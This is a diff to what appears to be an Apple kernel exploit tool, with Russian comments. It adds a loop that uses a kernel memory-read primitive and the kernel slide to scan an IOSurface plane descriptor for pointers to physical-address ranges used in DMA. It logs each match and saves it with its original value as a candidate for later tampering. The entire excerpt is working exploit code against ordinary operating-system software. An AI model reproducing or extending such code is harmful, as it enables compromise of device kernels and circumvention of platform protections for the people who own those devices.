@@ -6117,6 +6117,36 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                     nSlots++;
                 }
             }
+            // 1.9.157 (раунд 33): настоящий источник PA для DMA = ranges ВНУТРИ
+            // plane-desc (IOMemoryDescriptor-копия, снапшот при IOSurfaceCreate) —
+            // слот +0x98 на DART-пути не читается (поэтому 1.9.154/155 мимо).
+            // Ищем указатель на ranges в plane-desc: [P]==backingPA / pfn-формы.
+            if (objs[4]) {
+                uint64_t pd = objs[4];
+                uint64_t pvt = kp_untag_ptr(early_kread64(pd));
+                kpNote(r, [NSString stringWithFormat:@"  planeDesc vtable: %#llx (file %#llx) — класс IOMD",
+                          (unsigned long long)pvt, (unsigned long long)(pvt - kslide)]);
+                for (uint32_t o = 0; o + 8 <= 0x200 && nSlots < 8; o += 8) {
+                    uint64_t P = kp_untag_ptr(early_kread64(pd + o));
+                    if (!kpLooksLikeKernelPointer(P) || (uint32_t)(P & 0x3fff) + 0x10 > 0x4000) continue;
+                    uint64_t a0 = early_kread64(P);
+                    uint64_t a1 = early_kread64(P + 8);
+                    int form = 0;
+                    if (a0 == backingPA) form = 2;
+                    else if ((uint32_t)(a0 >> 32) == pfn32) form = 1;
+                    else if (a0 == (backingPA >> 14)) form = 3;
+                    if (!form) continue;
+                    BOOL dup = NO;
+                    for (int j = 0; j < nSlots; j++) if (slotVAs[j] == P) { dup = YES; break; }
+                    if (dup) continue;
+                    kpNote(r, [NSString stringWithFormat:@"  ranges-ptr @ pd+%#x → %#llx: [0]=%#018llx [8]=%#018llx форма%d",
+                              o, (unsigned long long)P, (unsigned long long)a0, (unsigned long long)a1, form]);
+                    slotVAs[nSlots] = P;
+                    origQs[nSlots] = a0;
+                    slotForm[nSlots] = form;
+                    nSlots++;
+                }
+            }
             if (nSlots) {
                 rangesVA = slotVAs[0];   // совместимость со старым кодом ниже
                 int stuck = 0;
